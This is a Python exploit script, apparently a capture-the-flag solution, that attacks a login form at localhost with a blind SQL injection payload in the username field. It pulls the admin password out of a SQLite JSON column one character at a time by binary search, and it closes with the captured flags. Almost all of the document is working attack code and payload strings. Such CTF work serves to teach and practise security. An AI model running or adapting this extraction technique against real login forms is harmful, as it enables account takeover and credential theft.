#!/usr/bin/env python3

"""
Server at http://localhost:3000

<form action="/login" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>`
"""

"""
If we set the following as the username:
") AS _, 'true' AS password FROM db WHERE unicode(substr( json_extract(users, '$.admin.password'), index )) < value UNION SELECT 'pad' AS _, 'false' AS password FROM db  --

Set password to 'true', then if we can login successfully, we know that $.admin.password[index] < value;
otherwise, we know that $.admin.password[index] >= value.

Example:
username: ") AS _, 'true' AS password FROM db WHERE unicode(substr( json_extract(users, '$.admin.password'), 1 )) < 64 UNION SELECT 'pad' AS _, 'false' AS password FROM db  --
password: true

Login successful, so we know that $.admin.password[1] < 64.
Login unsuccessful, so we know that $.admin.password[1] >= 64.

We will use binary search to find the password.
"""

import requests

url = "http://localhost:3000/"
# url = "http://10.113.184.121:10081/"

login_url = f"{url}login"


def login(username, password):
    data = {"username": username, "password": password}
    r = requests.post(login_url, data=data)
    return r.text


# Login successful, r.text = "<h1>Success!</h1>"
# Login unsuccessful, r.text = "Unauthorized"

# test_guest = login("guest", "guest")
# print(test_guest)


# username = f"\") AS _, 'true' AS password FROM db WHERE unicode(substr( json_extract(users, '$.admin.password'), 1 )) < 96 UNION SELECT 'pad' AS _, 'false' AS password FROM db  --"
# test_admin = login(username, "true")
# print(test_admin)

# username = f"\") AS _, 'true' AS password FROM db WHERE unicode(substr( json_extract(users, '$.admin.password'), 1 )) < 64 UNION SELECT 'pad' AS _, 'false' AS password FROM db  --"
# test_admin = login(username, "true")
# print(test_admin)


def find_password():
    password = ""
    for i in range(1, 64):
        lo = 0
        hi = 128
        while lo < hi:
            mid = (lo + hi) // 2
            username = f"\") AS _, 'true' AS password FROM db WHERE unicode(substr( json_extract(users, '$.admin.password'), {i} )) < {mid} UNION SELECT 'pad' AS _, 'false' AS password FROM db  --"
            result = login(username, "true")
            if "Success" in result:
                hi = mid
            else:
                lo = mid + 1
        if lo == 128:
            break
        password += chr(lo - 1)
    return password


print(find_password())
# FLAG{flag-1}
# FLAG{sqlite_js0n_inject!on}